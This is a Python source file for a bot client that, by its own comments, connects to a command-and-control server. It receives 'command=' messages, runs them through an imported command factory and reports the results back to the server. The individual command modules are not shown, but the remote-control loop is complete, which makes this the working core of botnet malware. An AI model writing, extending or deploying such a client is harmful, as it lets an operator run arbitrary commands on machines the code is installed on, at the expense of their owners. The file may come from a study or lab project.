from socket import *
import sys
from threading import Thread

from commands.command_factory import command_factory

# Defines a client program that acts like a bot that can receive and send messages to the C&C server program over a network connection

# Function is run in a separate thread and continuously receives messages from the server
def receive():
    while True:
        msg = client_socket.recv(BUFSIZ).decode("utf8")
        if msg == "{quit}":
            client_socket.close()
            print("Quitting...")
            break
        elif "command=" in msg:
            execute_command(msg)
        elif not msg:
            break
        else:
            print(msg)
        
# Listens for input from the user and sends it to the server
def send():
    while True:
        msg = input()
        client_socket.send(bytes(msg, "utf8"))
        if msg == "{quit}":
            break
 
# Takes a string containing a command to be executed by the bot and parses it into the command name and its parameters
# Format for the command must be:
# command=do_something, param1=value1, param2=value2, param3=value3
def parse_command(command_message):
    pairs = command_message.split(", ")

    command_pair = pairs.pop(0)
    command_parts = command_pair.split("=")
    command_name = command_parts[1]

    params = {}
    for pair in pairs:
        parts = pair.split("=")
        param_name = parts[0]
        param_value = parts[1]
        params[param_name] = param_value

    return command_name, params

# Executes the parsed command by creating a new command object using the Command Factory and calling its execute() 
# Also sends the details of the executed command back to the server
def execute_command(data):
    command_name, params = parse_command(data) 
    command = command_factory(command_name, params)
    command.execute() 
    msg = command.get_details()
    client_socket.send(bytes(msg, "utf8"))

# Initializes the host and port parameters for connecting to the server using command line arguments
# Creates a socket object, starts the receive and send threads, and waits for them to complete
if __name__ == "__main__":
    HOST = sys.argv[1]
    PORT = int(sys.argv[2])
    if not PORT:
        PORT = 33000

    BUFSIZ = 1024
    ADDR = (HOST, PORT)

    client_socket = socket(AF_INET, SOCK_STREAM)
    client_socket.connect(ADDR)

    receive_thread = Thread(target=receive)
    send_thread = Thread(target=send)
    receive_thread.start()
    send_thread.start()
    receive_thread.join()
    send_thread.join()